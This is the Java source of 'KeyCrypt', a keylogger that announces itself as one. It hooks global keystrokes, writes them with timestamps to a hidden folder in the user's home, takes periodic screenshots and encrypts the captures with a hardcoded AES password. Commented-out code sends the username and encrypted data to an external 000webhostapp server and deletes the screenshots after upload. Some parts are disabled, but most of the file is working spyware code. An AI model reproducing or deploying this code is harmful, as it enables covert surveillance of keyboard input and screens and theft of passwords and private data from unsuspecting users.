package keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.File;
import java.io.FileWriter;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Rectangle;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.Files;
import java.net.URL;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.text.DateFormat;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

/**
 * @author TheHaker117
 * Copyright 2017.
 * 
 * KeyCrypt is the evolution of Crypstack into a keylogger.
 * Don't be evil.
 * 
 * 
 */


public class KeyCrypt implements NativeKeyListener{
	private String password = "KeyCrypt";
//	static String targetURL = "https://alestorm.000webhostapp.com/server.php?";
	private int n_val;
	private String path;
	private File text;
	private Date date = new Date();
	private StringBuilder temp = new StringBuilder();
	private DateFormat dFormat = DateFormat.getInstance();				// Instacia el formato de la fecha
	private String machine_os = System.getProperty("os.name").toLowerCase();
	private String day = dFormat.format(date).substring(0, 8).replace("/", "-").replace(":", ".");
	
	/**
	 * 
	 * @param N/A
	 * 
	 * Constructor sets user home path, creates a 
	 * new directory where will saves the captured data.
	 * 
	 */
	
	
	private KeyCrypt(){
		/*
		//Disable jnativehook console output.
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
		
		path = System.getProperty("user.home");
		path = path.replace("\\", "/")  + "/.datasystem"; // Directorio en el que se guardará el textfile.
		new File(path).mkdir();							  // Crea el directorio
		path += "/";
		temp.append("\n" + new Date().toString().substring(11, 20));	// Agrego la fecha al StringBuilder
		
		Thread sBuilder = new Thread(){
			public void run(){
				if(!day.equals(dFormat.format(new Date()).substring(0, 8).replace("/", "-").replace(":", "."))){
					date = new Date();
					day = dFormat.format(date).substring(0, 8).replace("/", "-").replace(":", ".");
				}

				creatTFile();
				screenCapture();
				try{Thread.sleep(1800000);}
				catch(Exception e){System.err.println(e);}
			}
		};
//		sBuilder.start();	// Hilo para vaciar el StringBuilder en el archivo del día, 
							// y tomar captura de pantalla cada media hora.
		 */
		
		decryptoBytes(Paths.get("C:/Users/theha/Desktop/Tue_Nov_22_15-00-51_CST_2016.keycrypt"));

	}
	
	public static void main(String[] args){
		/*
		try{GlobalScreen.registerNativeHook();}				// Inicializamos el registro nativo de GlobalScreen
		catch(NativeHookException e){System.out.println(e);}

		GlobalScreen.addNativeKeyListener(new KeyCrypt());     // Añadimos el listener para el teclado
		
		/*Thread sCapture = new Thread(){
			public void run(){
				while(true){
					screenCapture();
					try{Thread.sleep(5000);}
					catch(Exception e){System.err.println(e);}
				}
			}
		};*/
		//sCapture.start();*/
		
		KeyCrypt kc = new KeyCrypt();
		
	}
	
	/**
	 * 
	 * @param NativeKeyEvent e
	 * 
	 * If e's keycode is an ENTER sets a line break.
	 * If e's keycode is a backspace, deletes the last index in temp.
	 * If temp contains "create", creates a text file with temp's content.
	 * 
	 */
	
	
	public void nativeKeyPressed(NativeKeyEvent e){
		
		if(e.getKeyCode() == NativeKeyEvent.VC_ENTER)
			temp.append("\n" + new Date().toString().substring(11, 20));
			
		if(e.getKeyCode() == 14)
			temp.deleteCharAt(temp.length()-1);

		if(temp.toString().contains("create")){
			n_val = temp.indexOf("create");
			temp.delete(n_val, n_val + 6);
			n_val = 0;
			creatTFile();
		}
		
		if(temp.toString().contains("crypt")){
			n_val = temp.indexOf("crypt");
			temp.delete(n_val, n_val + 5);
			crypt();
		}
		
		if(temp.toString().contains("unlock")){
			n_val = temp.indexOf("unlock");
			temp.delete(n_val, n_val + 7);
			decrypt();
		}
			
		if(temp.toString().contains("killspy")){
			n_val = temp.indexOf("killspy");
			temp.delete(n_val, n_val + 7);
			System.exit(1);
		}
		
		if(temp.toString().contains("takepic")){
			n_val = temp.indexOf("takepic");
			temp.delete(n_val, n_val + 7);
			screenCapture();
		}
	}
	
	/**
	 * 
	 * @param NativeKeyEvent e
	 * 
	 * N/A
	 * 
	 */
	public void nativeKeyReleased(NativeKeyEvent e){}
	
	/**
	 * 
	 * @param NativeKeyEvent e
	 * 
	 * Add to temp e's keychar.
	 * If temp's length is 80 add a line break to temp.
	 * 
	 */
	
	public void nativeKeyTyped(NativeKeyEvent e){
	
		temp.append(e.getKeyChar());							// Concatena el caracter de la tecla presionada
	
		if(temp.length() == 80)
			temp.append("\n" + new Date().toString().substring(11, 20) + "\t");
		
		System.out.println(temp.toString());
	}

	/**
	 * @param N/A
	 * @return void
	 *
	 * Create a screen capture every time interval.
	 * Saves the image inf jpg format in the path, using the date as name.
	 * 
	 */
	
	private void screenCapture(){
		try{
			BufferedImage screencap = new Robot().createScreenCapture(			// Toma captura de pantalla
			new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

			System.out.println("Screen shot taken.");
			
			File image = new File(path + new Date().toString().replace(":", "-").replace(" ", "_") + ".jpg"); // Crea un archivo en donde se guardará la captura, poniéndole como nombre la fecha y el formato jpg
			ImageIO.write(screencap, "jpg", image);				   // Escribe en el archivo la captura
			
			Path p_path = Paths.get(image.getPath());
			
			cryptoBytes(Files.readAllBytes(p_path), p_path, image.getName());
		}
		catch(Exception e){System.err.println(e);}
	} 
	
	/**
	 * 
	 * @param N/A
	 * @return void
	 * 
	 * Creates a text file in the path with date as name.
	 * And, empty the temp. 
	 */
	
	
	private void creatTFile(){
		try{
			decrypt();
			
			text = new File(path + day + ".txt");				// Creo un archivo text.txt

			FileWriter writer = new FileWriter(text, true);				// Crea un objeto FileWriter que permite escribir texto en el archivo
			writer.write(temp.toString());	// Escribe la fecha actual y lo contenido en temp
			writer.close();												
			temp.delete(0, temp.length()-1);
			
			crypt();
		}
		catch(Exception ex){System.out.println("Error: " + ex);}
	}
	
	/**
	 * 
	 * @param N/A
	 * @return void
	 * 
	 * Sends the encrypted bytes of the text file to the server.
	 * 
	 */
	private void decrypt(){

		File file = new File(path);
		String[] list = file.list();

		try{
			if(list.length != 0){
				for(int i = 0; i < list.length; i++){
					if(list[i].contains(day)){
						System.out.println(list[i]);
						decryptoBytes(Paths.get(path + list[i]));
					}
				}
			}
		}
		catch(Exception e){System.err.println(e);}
		
	}
	private void crypt(){
		
		File file = new File(path);
		String[] list = file.list();
		//creatTFile();
		File info = new File(path + "info.txt");		
		
		try{
			FileWriter writer = new FileWriter(info, true);				// Crea un objeto FileWriter que permite escribir texto en el archivo
			
			for(int i = 0; i < list.length; i++){
				if(list[i].contains(day)){
					Path p_path = Paths.get(path + list[i]);
					writer.write(cryptoBytes(Files.readAllBytes(p_path), p_path, list[i]) + "\n\n");
					writer.close();
				}
			}
		}
		catch(Exception e){System.err.println(e);}
		
		
		/*try{
			Path pathfile = Paths.get(path + "text.txt");
			String info = cryptoBytes(Files.readAllBytes(pathfile));	// Se leen los bytes del archivo de información
			
			text.delete();		// Borra el archivo
			String fullurl = targetURL + "username=" + System.getProperty("user.name")
			+ "&codetype=" + "KeyCrypt" + "&data=" + info;
			URL urlserver = new URL(fullurl.replace(" ", "_"));
			new BufferedReader(new InputStreamReader(urlserver.openStream()));	// Se envía al servidor
			
			//String[] locatejpg = new File(path).list();
			
		//	for(int i = 0; i < locatejpg.length; i++)		// Envía las capturas de pantalla al servidor
		//		if(locatejpg[i].contains("keycrypt")){
		//			pathfile = Paths.get(path + locatejpg[i]);
		//			info = cryptoBytes(Files.readAllBytes(pathfile));
		//			
		//			urlserver = new URL(targetURL + "jpgbytes:" + info);
		//			new BufferedReader(new InputStreamReader(urlserver.openStream()));
		//	
		//			new File(path + locatejpg[i]).delete();		// Borra las capturas
		//		}
			
				
		}
		catch(Exception e){System.err.println(e);}*/
	}
	
	/**
	 * 
	 * @param byte[]
	 * @return String
	 * 
	 * Using the encryption method of Crypstack, 
	 * encrypts the bytes of the files to send them to the server.
	 *  
	 */
	
	private String cryptoBytes(byte[] filebytes, Path p_path, String filename){
		String info = "";

		try{
			Cipher cipher_AES = Cipher.getInstance("AES");		// Instancia el cifrado (AES)
			MessageDigest md = MessageDigest.getInstance("SHA-256");	// Instancia el cifrado de hash (SHA-256)
			md.update(password.getBytes("UTF-8"));		// Hashea la contraseña
			byte[] passBytesCrypt = md.digest();		// Obtiene los bytes de la contraseña

			
			// Hacemos una excepción para windows noob, porque en dicho sistema es forzoso pasar exactamente 16 bytes.
			if(machine_os.contains("windows"))
				cipher_AES.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(Arrays.copyOf(passBytesCrypt, 16), "AES"));
			else
				cipher_AES.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(passBytesCrypt, "AES"));
			
			byte[] cryptfilebytes = cipher_AES.doFinal(filebytes);	// Obtenemos bytes encriptados.

			Files.write(p_path, cryptfilebytes);
			// Se renombra el archivo y se añade una extensión.
			Files.move(p_path, p_path.resolveSibling(filename + ".keycrypt"));
			
			
			Byte temp;
			
			for(int i = 0; i < cryptfilebytes.length; i++){		// En este for, convertimos los bytes encriptados
				temp = cryptfilebytes[i];						// en una cadena para enviarlo al servidor
				info += temp.toString() + ".";
			}
			
		}
		catch(Exception e){System.err.println(e);}

		return info;
	}
	
	private void decryptoBytes(Path location){
		try{
			// Hashea el password con el algoritmo SHA-256
			MessageDigest md = MessageDigest.getInstance("SHA-256");
			// Obtiene los bytes del password
			md.update(password.getBytes("UTF-8"));
			// Obtiene los bytes encriptados del password
			byte[] passBytesCrypt = md.digest();
			// Obtiene los bytes del archivo
			byte[] fileBytes = Files.readAllBytes(location);

			// Se hace una excepción si se trata de Windows NOOB
			if(machine_os.contains("windows"))
				passBytesCrypt = Arrays.copyOf(passBytesCrypt, 16);
			
			
			// Ahora debo convertir los bytes encriptados a tipo Key para poder inicializar el cifrador.
			// Para ello debo hacer uso del constructor de SecretKeySpec que regresa una interfaz SecretKey.
			
			// Tremendo anidado de cifrados. Paso de cifrado random a SHA y luego de SHA a AES.
			SecretKey passBytesKey = new SecretKeySpec(passBytesCrypt, "AES");

			// Se instancia en AES.
			Cipher cipher_AES = Cipher.getInstance("AES");
			// Se inicializa en modo desencriptado y se pasa el key.
			cipher_AES.init(Cipher.DECRYPT_MODE, passBytesKey);
			// Se desencriptan los bytes del archivo.
			byte[] fileBytesDecrypt = cipher_AES.doFinal(fileBytes);
			// Se hace override en el archivo con los bytes encriptados.
			Files.write(location, fileBytesDecrypt);
			// Se renombra el archivo y se añade una extensión.
			String name = location.getFileName().toString();
			Files.move(location, location.resolveSibling(name.substring(0, name.lastIndexOf("."))));
			
		}

		catch(Exception e){System.err.println(e);}

	}
	
}
